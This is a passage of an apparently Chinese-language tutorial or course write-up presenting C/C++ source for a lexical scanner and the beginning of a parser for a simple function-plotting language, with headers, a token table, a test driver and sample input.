keyword">if</span> <span class="token punctuation">(</span><span class="token function">isalpha</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//如果是英文字母，一定是函数、关键字、PI、E等</span><span class="token punctuation">&#123;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>Char <span class="token operator">=</span> <span class="token function">GetChar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isalnum</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//如果是字母或数字</span><span class="token function">AddCharTokenString</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//加入缓冲区</span><span class="token keyword">else</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">BackChar</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//退回缓冲区</span>token <span class="token operator">=</span> <span class="token function">JudgeKeyToken</span><span class="token punctuation">(</span>TokenBuffer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//判断是否在记号表中</span>token<span class="token punctuation">.</span>lexeme <span class="token operator">=</span> TokenBuffer<span class="token punctuation">;</span><span class="token keyword">return</span> token<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isdigit</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//如果是数字，一定是常量</span><span class="token punctuation">&#123;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>Char <span class="token operator">=</span> <span class="token function">GetChar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isdigit</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">AddCharTokenString</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">else</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>Char <span class="token operator">==</span> <span class="token char">'.'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">AddCharTokenString</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>Char <span class="token operator">=</span> <span class="token function">GetChar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isdigit</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">AddCharTokenString</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">else</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">BackChar</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">;</span>token<span class="token punctuation">.</span>type <span class="token operator">=</span> CONST_ID<span class="token punctuation">;</span>token<span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token function">atof</span><span class="token punctuation">(</span>TokenBuffer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> token<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token comment">//如果是其他符号</span><span class="token punctuation">&#123;</span><span class="token keyword">switch</span> <span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">case</span> <span class="token char">';'</span><span class="token operator">:</span> token<span class="token punctuation">.</span>type <span class="token operator">=</span> SEMICO<span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token char">'('</span><span class="token operator">:</span> token<span class="token punctuation">.</span>type <span class="token operator">=</span> L_BRACKET<span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token char">')'</span><span class="token operator">:</span> token<span class="token punctuation">.</span>type <span class="token operator">=</span> R_BRACKET<span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token char">','</span><span class="token operator">:</span> token<span class="token punctuation">.</span>type <span class="token operator">=</span> COMMA<span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token char">'+'</span><span class="token operator">:</span> token<span class="token punctuation">.</span>type <span class="token operator">=</span> PLUS<span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token char">'-'</span><span class="token operator">:</span>Char <span class="token operator">=</span> <span class="token function">GetChar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>Char <span class="token operator">==</span> <span class="token char">'-'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>Char <span class="token operator">!=</span> <span class="token char">'\n'</span> <span class="token operator">&amp;&amp;</span> Char <span class="token operator">!=</span> <span class="token constant">EOF</span><span class="token punctuation">)</span> Char <span class="token operator">=</span> <span class="token function">GetChar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">BackChar</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token function">GetToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">BackChar</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">;</span>token<span class="token punctuation">.</span>type <span class="token operator">=</span> MINUS<span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">case</span> <span class="token char">'/'</span><span class="token operator">:</span>Char <span class="token operator">=</span> <span class="token function">GetChar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>Char <span class="token operator">==</span> <span class="token char">'/'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>Char <span class="token operator">!=</span> <span class="token char">'\n'</span> <span class="token operator">&amp;&amp;</span> Char <span class="token operator">!=</span> <span class="token constant">EOF</span><span class="token punctuation">)</span> Char <span class="token operator">=</span> <span class="token function">GetChar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">BackChar</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token function">GetToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">BackChar</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">;</span>token<span class="token punctuation">.</span>type <span class="token operator">=</span> DIV<span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">case</span> <span class="token char">'*'</span><span class="token operator">:</span>Char <span class="token operator">=</span> <span class="token function">GetChar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>Char <span class="token operator">==</span> <span class="token char">'*'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>token<span class="token punctuation">.</span>type <span class="token operator">=</span> POWER<span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">BackChar</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">;</span>token<span class="token punctuation">.</span>type <span class="token operator">=</span> MUL<span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">default</span><span class="token operator">:</span>token<span class="token punctuation">.</span>type <span class="token operator">=</span> ERRTOKEN<span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> token<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="test-scanner-cpp"><a href="#test-scanner-cpp" class="headerlink" title="test_scanner.cpp"></a>test_scanner.cpp</h4><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"scanner.h"</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>Token token<span class="token punctuation">;</span>FILE <span class="token operator">*</span>fp<span class="token punctuation">;</span><span class="token function">InitScanner</span><span class="token punctuation">(</span><span class="token string">"test_scanner.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"记号类型    字符串     常数值     函数指针\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"------------------------------------------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>token <span class="token operator">=</span> <span class="token function">GetToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获得记号</span><span class="token keyword">if</span> <span class="token punctuation">(</span>token<span class="token punctuation">.</span>type <span class="token operator">!=</span> NONTOKEN<span class="token punctuation">)</span><span class="token comment">//打印记号内容</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%4d,%12s,%12f,%12x\n"</span><span class="token punctuation">,</span> token<span class="token punctuation">.</span>type<span class="token punctuation">,</span> token<span class="token punctuation">.</span>lexeme<span class="token punctuation">,</span> token<span class="token punctuation">.</span>value<span class="token punctuation">,</span> token<span class="token punctuation">.</span>FuncPtr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">else</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"------------------------------------------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">CloseScanner</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="2、语法分析器"><a href="#2、语法分析器" class="headerlink" title="2、语法分析器"></a>2、语法分析器</h3><p><strong>测试文本：</strong><br><strong>test_parser.txt</strong></p><pre class="language-txt" data-language="txt"><code class="language-txt">ORIGIn IS (350, 220);  rot is 0;scale is (50, 100);FOR T FROM 0 TO 2*PI STEP PI/500 DRAW(cos(T),sin(T));scale is (100, 100);FOR T FROM 0 TO 2*PI STEP PI/500 DRAW(cos(2*T),sin(T));</code></pre><h4 id="Parser-h"><a href="#Parser-h" class="headerlink" title="Parser.h"></a>Parser.h</h4><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifndef</span> <span class="token expression">PARSER_H</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">PARSER_H</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">"scanner.h"</span></span><span class="token keyword">typedef</span> <span class="token keyword">double</span><span class="token punctuation">(</span><span class="token operator">*</span>FuncPtr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">ExprNode</span>                                             <span class="token comment">//语法树节点类型</span><span class="token punctuation">&#123;</span><span class="token keyword">enum</span> <span class="token class-name">Token_Type</span> OpCode<span class="token punctuation">;</span>                                 <span class="token comment">//PLUS,MINUS,MUL,DIV,POWER,FUNC,CONST_ID，T</span><span class="token keyword">union</span><span class="token punctuation">&#123;</span><span class="token keyword">struct</span> <span class="token punctuation">&#123;</span> ExprNode <span class="token operator">*</span>Left<span class="token punctuation">,</span> <span class="token operator">*</span>Right<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>CaseOperater<span class="token punctuation">;</span>     <span class="token comment">//二元运算：只有左右孩子的内部节点</span><span class="token keyword">struct</span> <span class="token punctuation">&#123;</span> ExprNode <span class="token operator">*</span>Child<span class="token punctuation">;</span> FuncPtr MathFuncPtr<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>CaseFunc<span class="token punctuation">;</span><span class="token comment">//函数调用：只有一个孩子的内部节点，还有一个指向对应函数名的指针 MathFuncPtr</span><span class="token keyword">double</span> CaseConst<span class="token punctuation">;</span>                                   <span class="token comment">//常数：叶子节点  右值</span><span class="token keyword">double</span> <span class="token operator">*</span>CaseParmPtr<span class="token punctuation">;</span>                                <span class="token comment">//参数T   左值：存放T的值得地址</span><span class="token punctuation">&#125;</span>Content<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">extern</span> <span class="token keyword">void</span> <span class="token function">Parser</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>SrcFilePtr<span class="token punctuation">)</span><span class="token punctuation">;</span>                       <span class="token comment">//语法分析器对外接口</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span> <span class="token expression"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression">once</span></span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression">once</span></span></code></pre><h4 id="Scanner-h"><a href="#Scanner-h" class="headerlink" title="Scanner.h"></a>Scanner.h</h4><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifndef</span> <span class="token expression">SCANNER_H</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SCANNER_H</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;ctype.h></span> <span class="token comment">//ctype.h是C标准函数库中的头文件，定义了一批C语言字符分类函数，用于测试字符是否属于特定的字符类别，</span></span><span class="token comment">//如字母字符、控制字符等等。</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdarg.h></span><span class="token comment">//让函数可以接收可变参数</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;math.h></span></span><span class="token keyword">enum</span> <span class="token class-name">Token_Type</span><span class="token comment">//记号类别枚举</span><span class="token punctuation">&#123;</span>ORIGIN<span class="token comment">/* 0 */</span><span class="token punctuation">,</span> SCALE<span class="token comment">/* 1 */</span><span class="token punctuation">,</span> ROT<span class="token comment">/* 2 */</span><span class="token punctuation">,</span> IS<span class="token comment">/* 3 */</span><span class="token punctuation">,</span> TO<span class="token comment">/* 4 */</span><span class="token punctuation">,</span> STEP<span class="token comment">/* 5 */</span><span class="token punctuation">,</span> DRAW<span class="token comment">/* 6 */</span><span class="token punctuation">,</span> FOR<span class="token comment">/* 7 */</span><span class="token punctuation">,</span> FROM<span class="token comment">/* 8 */</span><span class="token punctuation">,</span><span class="token comment">//保留字</span>T<span class="token comment">/* 9 */</span><span class="token punctuation">,</span><span class="token comment">//参数</span>SEMICO<span class="token comment">/* 10 */</span><span class="token punctuation">,</span> L_BRACKET<span class="token comment">/* 11 */</span><span class="token punctuation">,</span> R_BRACKET<span class="token comment">/* 12 */</span><span class="token punctuation">,</span> COMMA<span class="token comment">/* 13 */</span><span class="token punctuation">,</span><span class="token comment">//分层符号</span>PLUS<span class="token comment">/* 14 */</span><span class="token punctuation">,</span> MINUS<span class="token comment">/* 15 */</span><span class="token punctuation">,</span> MUL<span class="token comment">/* 16 */</span><span class="token punctuation">,</span> DIV<span class="token comment">/* 17 */</span><span class="token punctuation">,</span> POWER<span class="token comment">/* 18 */</span><span class="token punctuation">,</span><span class="token comment">//运算符</span>FUNC<span class="token comment">/*19 */</span><span class="token punctuation">,</span><span class="token comment">//函数</span>CONST_ID<span class="token comment">/* 20 */</span><span class="token punctuation">,</span><span class="token comment">//常数</span>NONTOKEN<span class="token comment">/* 21 */</span><span class="token punctuation">,</span><span class="token comment">//空记号，标记源程序文件的结束</span>ERRTOKEN<span class="token comment">/* 22 */</span><span class="token comment">//出错记号，标记非法输入</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">double</span><span class="token punctuation">(</span><span class="token operator">*</span>MathFuncPtr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//MathFuncPtr代表一个指向返回double值并带有一个double形参的函数的指针的类型</span><span class="token keyword">struct</span> <span class="token class-name">Token</span><span class="token punctuation">&#123;</span>Token_Type type<span class="token punctuation">;</span><span class="token comment">//记号类别</span><span class="token keyword">char</span> <span class="token operator">*</span> lexeme<span class="token punctuation">;</span><span class="token comment">//属性，字符串，指向char类型的指针</span><span class="token keyword">double</span> value<span class="token punctuation">;</span><span class="token comment">//属性，常数的值，double型</span><span class="token keyword">double</span><span class="token punctuation">(</span><span class="token operator">*</span>FuncPtr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//属性，函数指针，代表一个指向返回double值并带有一个double形参的函数的指针的类型</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">static</span> Token TokenTab<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token comment">//符号表内容</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> CONST_ID<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"PI"</span><span class="token punctuation">,</span> <span class="token number">3.1415926</span><span class="token punctuation">,</span><span class="token constant">NULL</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> CONST_ID<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"E"</span><span class="token punctuation">,</span><span class="token number">2.71828</span><span class="token punctuation">,</span><span class="token constant">NULL</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> T<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"T"</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">,</span><span class="token constant">NULL</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> FUNC<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"SIN"</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">,</span>sin <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> FUNC<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"COS"</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">,</span>cos <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> FUNC<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"TAN"</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">,</span>tan <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> FUNC<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"LN"</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">,</span>log <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> FUNC<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"EXP"</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">,</span>exp <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> FUNC<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"SQRT"</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">,</span>sqrt <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> ORIGIN<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"ORIGIN"</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">,</span><span class="token constant">NULL</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> SCALE<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"SCALE"</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">,</span><span class="token constant">NULL</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> ROT<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"ROT"</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">,</span><span class="token constant">NULL</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> IS<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"IS"</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">,</span><span class="token constant">NULL</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> FOR<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"FOR"</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">,</span><span class="token constant">NULL</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> FROM<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"FROM"</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">,</span><span class="token constant">NULL</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> TO<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"TO"</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">,</span><span class="token constant">NULL</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> STEP<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"STEP"</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">,</span><span class="token constant">NULL</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> DRAW<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"DRAW"</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">,</span><span class="token constant">NULL</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">extern</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> LineNo<span class="token punctuation">;</span><span class="token comment">//跟踪记号所在源文件行号</span><span class="token keyword">extern</span> <span class="token keyword">int</span> <span class="token function">InitScanner</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//初始化词法分析器</span><span class="token keyword">extern</span> Token <span class="token function">GetToken</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取记号函数</span><span class="token keyword">extern</span> <span class="token keyword">void</span> <span class="token function">CloseScanner</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//关闭词法分析器</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression">once</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression">once</span></span></code></pre><h4 id="Parser-cpp"><a href="#Parser-cpp" class="headerlink" title="Parser.cpp"></a>Parser.cpp</h4><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">"parser.h"</span></span><span class="token comment">//#include"semantic.h"</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;Windows.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">Tree_trace</span><span class="token expression"><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token function">PrintSyntaxTree</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">warning</span><span class="token punctuation">(</span>disable<span class="token operator">:</span> <span class="token number">4996</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">warning</span><span class="token punctuation">(</span>disable<span class="token operator">:</span> <span class="token number">4703</span><span class="token punctuation">)</span></span></span><span class="token keyword">double</span> Parameter <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>Origin_x <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> Origin_y <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>Scale_x <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> Scale_y <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span>Rot_angle <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">static</span> Token token<span class="token punctuation">;</span><span class="token comment">//定义一个记号</span>   <span class="token comment">//辅助函数声明</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">FetchToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//调用词法分析器的GetToken，把得到的当前记录保存起来。如果得到的记号是非法输入errtoken，则指出一个语法错误</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">MatchToken</span><span class="token punctuation">(</span><span class="token keyword">enum</span> <span class="token class-name">Token_Type</span> The_Token<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//匹配当前记号</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">SyntaxError</span><span class="token punctuation">(</span><span class="token keyword">int</span> case_of<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//处理语法错误的子程序。根据错误的性质打印相关信息并且终止程序运行。错误性质可以根据传参不同来区分：SyntaxError（1）词法错   SyntaxError（2）语法错</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">ErrMsg</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> LineNo<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>descrip<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>string<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//打印错误信息</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token 